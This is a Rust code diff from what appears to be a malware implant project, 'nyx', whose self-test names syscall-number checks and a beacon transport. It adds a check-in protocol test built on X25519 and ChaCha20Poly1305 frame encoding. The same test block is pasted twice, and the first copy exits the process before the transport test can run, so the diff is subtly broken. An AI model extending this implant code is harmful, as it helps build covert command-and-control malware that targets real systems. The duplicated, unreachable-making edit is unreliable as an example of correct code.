@@ -106,6 +106,27 @@ pub unsafe extern "system" fn nyx_selftest() {
     // (SSN count already proven == 0xA3D; now test transport.)
     let _ = ssn_count;
 
+    // Protocol round-trip (no network): X25519 + ChaCha20Poly1305 + frame codec.
+    // 0xE01 = success; 0xE00 = failure.
+    let ikp = nyx_protocol::ImplantKeypair::generate();
+    let dummy_server_pub = [0x42u8; 32];
+    let key = ikp.session_key(&dummy_server_pub);
+    let pubkey = ikp.public_bytes();
+    let plaintext = b"check-in-test-payload";
+    let frame = nyx_protocol::encode_frame(&pubkey, 1, &key, plaintext);
+    let raw = match nyx_protocol::parse_frame(&frame) {
+        Ok(r) => r,
+        Err(_) => report_exit(exit_proc, 0xE00),
+    };
+    let decoded = match nyx_protocol::open_frame(&key, &raw) {
+        Ok(p) => p,
+        Err(_) => report_exit(exit_proc, 0xE00),
+    };
+    if decoded.as_slice() == plaintext.as_slice() {
+        report_exit(exit_proc, 0xE01);
+    }
+    report_exit(exit_proc, 0xE00);
+
     // Transport test: POST a known payload to the local Python echo server
     // (127.0.0.1:8443/beacon), which echoes the body back. Verify round-trip.
     // Exit: 0xC01 = success (response matches sent bytes); 0xC00 = transport
@@ -180,6 +201,30 @@ pub unsafe extern "system" fn nyx_selftest() {
         report_exit(exit_proc, 0xD07);
     }
     report_exit(exit_proc, 0xD08);
+
+    // Phase: protocol round-trip (proves crypto works under no_std + this alloc).
+    // Generate implant keypair, derive session key against a dummy server pubkey,
+    // encode a frame, decode it, verify the plaintext matches.
+    // 0xE01 = protocol round-trip success
+    // 0xE00 = protocol round-trip failed
+    let ikp = nyx_protocol::ImplantKeypair::generate();
+    let dummy_server_pub = [0x42u8; 32];
+    let key = ikp.session_key(&dummy_server_pub);
+    let pubkey = ikp.public_bytes();
+    let plaintext = b"check-in-test-payload";
+    let frame = nyx_protocol::encode_frame(&pubkey, 1, &key, plaintext);
+    let raw = match nyx_protocol::parse_frame(&frame) {
+        Ok(r) => r,
+        Err(_) => report_exit(exit_proc, 0xE00),
+    };
+    let decoded = match nyx_protocol::open_frame(&key, &raw) {
+        Ok(p) => p,
+        Err(_) => report_exit(exit_proc, 0xE00),
+    };
+    if decoded.as_slice() == plaintext.as_slice() {
+        report_exit(exit_proc, 0xE01);
+    }
+    report_exit(exit_proc, 0xE00);
 }
 
 /// Resolve a function in a loaded module by (module name, function name).
